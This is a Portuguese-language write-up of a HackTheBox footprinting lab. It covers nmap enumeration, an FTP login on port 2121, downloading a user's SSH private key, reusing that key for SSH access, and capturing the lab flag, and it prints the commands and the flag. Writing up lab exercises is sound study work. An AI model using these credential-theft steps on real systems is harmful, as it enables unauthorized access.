# 🏴️ Footprinting Tests - Easy

> **Dificuldade:** Easy | **SO:** Linux | **Plataforma:** CPTS — Estudo de Footprinting

!!! info "Sobre esta página"
    Writeup do laboratório de footprinting (máquina easy) do HackTheBox. Foco em
    enumeração de serviços e obtenção de acesso inicial por reuso de chave SSH.

---

## 📋 Informações Gerais

| Campo | Valor |
|:------|:------|
| **Hostname** | `NIXEASY` |
| **IP** | `10.129.14.129` |
| **SO** | Linux — Ubuntu 20.04.1 LTS |
| **Dificuldade** | Easy |
| **Plataforma / Módulo** | CPTS — Footprinting |
| **Domínio interno** | `inlanefreight.htb` |
| **Data** | 01/06/2026 |
| **Status** | Finalizado |

---

## 🔍 Enumeração Inicial

### Portas e Serviços Encontrados

| Porta | Serviço | Versão / Banner |
|:------|:--------|:----------------|
| 21 | ftp | ProFTPD — `ftp.int.inlanefreight.htb` |
| 22 | ssh | OpenSSH 8.2p1 Ubuntu |
| 53 | domain | ISC BIND 9.16.1 |
| 2121 | ftp | ProFTPD — *Ceil's FTP* |

### Comando de Enumeração

```bash
sudo nmap -sS -sV --top-ports 1000 -T4 10.129.14.129
```

### Saída Relevante (evidência)

```shell
PORT     STATE SERVICE VERSION
21/tcp   open  ftp?
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Fingerprints dos serviços nao reconhecidos:
#  Port 21   -> 220 ProFTPD Server (ftp.int.inlanefreight.htb)
#  Port 2121 -> 220 ProFTPD Server (Ceil's FTP)
```

### Descobertas

- [x] Servidor FTP secundário numa porta **não padrão (2121)** — "Ceil's FTP"
- [x] Banner do FTP revela o **domínio interno** `inlanefreight.htb`
- [x] SSH disponível (porta 22) → potencial reuso de chave

---

## 🎯 Técnicas Utilizadas

| # | Técnica | Onde / Como foi aplicada |
|:--|:--------|:-------------------------|
| 1 | Enumeração de serviços (nmap) | Identificação do FTP na porta não padrão 2121 |
| 2 | Acesso a FTP | Login no FTP 2121 como usuário `ceil` |
| 3 | Exfiltração de chave privada SSH | Download de `id_rsa` de `~/.ssh/` via FTP |
| 4 | Reuso de chave SSH | `ssh -i id_rsa ceil@alvo` → shell como `ceil` |
| 5 | Localização da flag | Leitura de `/home/flag/flag.txt` |

---

## 🚀 Exploração / Acesso Inicial

### Vetor de Entrada

| Campo | Valor |
|:------|:------|
| **Vetor** | FTP (2121) → chave SSH exposta |
| **Falha explorada** | Chave privada `id_rsa` acessível/baixável via FTP |
| **Ferramentas** | nmap, ftp, ssh |
| **Acesso obtido como** | `ceil` |

!!! warning "Senha do FTP"
    O login no FTP como `ceil` foi bem-sucedido (`230 User ceil logged in`), mas
    **a senha utilizada não está registrada neste log**.

### Processo

```
1. Enumerar portas → identificar FTP em 2121 (Ceil's FTP)
2. Logar no FTP 2121 como ceil e navegar até .ssh/
3. Baixar id_rsa (e authorized_keys, id_rsa.pub)
4. chmod 600 id_rsa
5. ssh -i id_rsa ceil@10.129.14.129 → shell como ceil
```

### Comandos-Chave

```bash
ftp ceil@10.129.14.129 2121
# ftp> cd .ssh
# ftp> get id_rsa
# ftp> get authorized_keys
# ftp> get id_rsa.pub

chmod 600 id_rsa
ssh -i id_rsa ceil@10.129.14.129
```

### Evidência — exfiltração da chave via FTP

```shell
ftp> cd .ssh
250 CWD command successful
ftp> ls
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
ftp> get id_rsa
local: id_rsa remote: id_rsa
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
226 Transfer complete
3381 bytes received in 00:00 (405.52 KiB/s)
```

### Tentativas que NÃO funcionaram

- `nano` / `vi` / `vim authorized_keys` **dentro do cliente FTP** → `?Invalid command.`
- `cd .profile` e `cd authorized_keys` → `550 ...: Not a directory`

!!! tip "Lição"
    O cliente FTP interativo não edita arquivos remotos — só transfere. O caminho
    correto é `get` o arquivo e abri-lo localmente.

---

## 🐚 Shell e Pós-Acesso

Acesso obtido como `ceil` via SSH com a chave exfiltrada (Ubuntu 20.04.1 LTS).

### Usuários encontrados (`/home`)

| Usuário | Observação |
|:--------|:-----------|
| `ceil` | usuário acessado |
| `cry0l1t3` | presente em `/home` |
| `flag` | diretório que contém a flag |

### Credenciais / Chaves Encontradas

| Tipo | Valor / Local |
|:-----|:--------------|
| Chave SSH privada | `id_rsa` baixado de `~/.ssh/` do `ceil` via FTP 2121 |

### Evidência — acesso SSH e flag

```shell
└──╼ [★]$ chmod 600 id_rsa
└──╼ [★]$ ssh -i id_rsa ceil@10.129.14.129
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20

ceil@NIXEASY:~$ cd /home/flag/
ceil@NIXEASY:/home/flag$ cat flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

---

## 🚩 Flags

- [x] Flag capturada

| Flag | Local |
|:-----|:------|
| `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}` | `/home/flag/flag.txt` |

!!! note
    A flag foi obtida em `/home/flag/`. Não houve acesso a `/root` neste log —
    portanto **não há root flag** registrada.

---

## 📖 Resumo Técnico

| Campo | Valor |
|:------|:------|
| **Causa raiz** | Chave privada SSH exposta através de um serviço FTP acessível |
| **Cadeia de ataque** | Enumeração (nmap) → FTP 2121 como `ceil` → download de `id_rsa` → SSH como `ceil` → flag em `/home/flag/` |
| **Acesso final** | `ceil` (usuário) |

---

## 💡 Lições Aprendidas

- **O que funcionou:** reuso da `id_rsa` exfiltrada do FTP para autenticar via SSH.
- **O que atrasou:** tentar editar arquivos dentro do cliente FTP (`nano`/`vi`/`vim`) — não suportado.
- **Comandos para revisar depois:** enumeração de serviços em **portas altas/não padrão** (o FTP relevante estava na 2121, não na 21).
- **Técnicas para estudar melhor:** após obter qualquer acesso a arquivos, sempre conferir `~/.ssh/` por chaves privadas legíveis.
